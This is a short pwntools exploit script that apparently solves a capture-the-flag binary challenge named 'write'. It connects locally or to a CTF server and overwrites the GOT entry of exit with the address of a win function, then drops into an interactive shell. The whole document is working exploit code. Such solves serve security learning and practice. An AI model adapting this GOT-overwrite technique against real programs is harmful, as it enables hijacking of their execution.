from pwn import *

context.binary = './write'
elf = context.binary

def exploit():
    if args.REMOTE:
        p = remote('pwn-ctf.cyberspace.ma', 8003)
    else:
        p = elf.process()

    exit_got = elf.got.exit
    win_addr = elf.symbols.win

    p.sendlineafter("afriika7: ", str(exit_got))
    p.sendlineafter("lwa9ii3: ", str(win_addr))
    
    p.interactive()

if __name__ == '__main__':
    exploit()
